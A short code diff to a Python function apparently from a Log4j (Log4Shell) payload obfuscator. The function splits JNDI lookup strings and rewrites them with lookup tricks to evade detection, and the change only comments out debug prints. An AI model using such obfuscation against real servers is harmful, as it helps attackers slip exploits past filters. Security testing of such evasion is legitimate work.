@@ -57,10 +57,9 @@ def log4j_bypass(payload):
     if payload == '':
         print("请输入需要混淆的payload")
     try:
-        print(payload)
         bypass_payload = ''
         str1= regex_str(r'(\$\{.*?\:)',payload)
-        print('str1:'+str1)
+        # print('str1:'+str1)
         for i in str1:
             n=['n1','n2','n3','n4']
             # :- lower upper date
@@ -68,14 +67,14 @@ def log4j_bypass(payload):
                 i = mix(i,n)
             bypass_payload = bypass_payload+i
         str2= regex_str(r'\$\{.*?:(.*?:\/\/)',payload)
-        print('str2:'+str2)
+        # print('str2:'+str2)
         for i in str2:
             n=['n1','n2','n4']
             # :- lower date
             i = mix(i,n)
             bypass_payload = bypass_payload+i
         str3= regex_str(r'\/\/(.*})',payload)
-        print('str3:'+str3)
+        # print('str3:'+str3)
         for i in str3:
             n=['n1','n2']
             # :- lower upper
